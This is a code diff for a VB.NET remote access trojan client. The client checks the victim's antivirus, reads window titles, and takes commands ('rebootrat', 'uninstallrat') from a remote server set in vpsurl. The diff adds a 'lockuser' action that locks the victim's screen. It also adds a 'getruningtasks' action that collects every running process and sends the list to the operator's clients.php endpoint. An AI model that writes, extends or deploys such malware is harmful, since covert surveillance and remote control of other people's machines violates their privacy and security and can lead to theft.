@@ -14,16 +14,14 @@ Public Class MainForm
     Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
     'Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal Command As String, ByVal ReturnString As String, ByVal ReturnLength As Long, ByVal hWnd As Long) As Long
     Public Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As UInt32, ByVal hwndCallback As IntPtr) As UInt32
+    Public mainWebClient As WebClient = New WebClient()
+    Public upTime As Integer = 0
     Private Function GetCaption() As String
         Dim Caption As New StringBuilder(256)
         Dim hWnd As IntPtr = GetForegroundWindow()
         GetWindowText(hWnd, Caption, Caption.Capacity)
         Return Caption.ToString()
     End Function
-
-    Public mainWebClient As WebClient = New WebClient()
-    Public upTime As Integer = 0
-
     Public Shared Function GetAntivirus() As String
         Try
             Dim Name As String = String.Empty
@@ -187,7 +185,7 @@ Public Class MainForm
             Environment.Exit(0)
 
         ElseIf actionType = "rebootrat" Then
-            Shell(Application.ExecutablePath)
+            Process.Start(Application.ExecutablePath)
             Environment.Exit(0)
 
         ElseIf actionType = "uninstallrat" Then
@@ -234,6 +232,21 @@ Public Class MainForm
 
         ElseIf actionType = "camerashare" Then
             ' TODO : camera share
+        ElseIf actionType = "lockuser" Then
+            Invoke(Sub() LockedWindow.Show())
+
+        ElseIf actionType = "unlockuser" Then
+            Invoke(Sub() LockedWindow.Hide())
+
+        ElseIf actionType = "getruningtasks" Then
+            Dim total As String = ""
+            For Each p As Process In Process.GetProcesses
+                total += p.Id & "|"
+                total += p.ProcessName & "|"
+                total += p.MainWindowTitle & "|"
+                total += (p.WorkingSet64 / 1024) / 1024 & "[;;]"
+            Next
+            mainWebClient.DownloadString(My.Settings.vpsurl & "clients.php?action=sendtasks&actioncontent=" & total)
 
         ElseIf actionType = "playmp3" Then
             ' TODO : check this feature
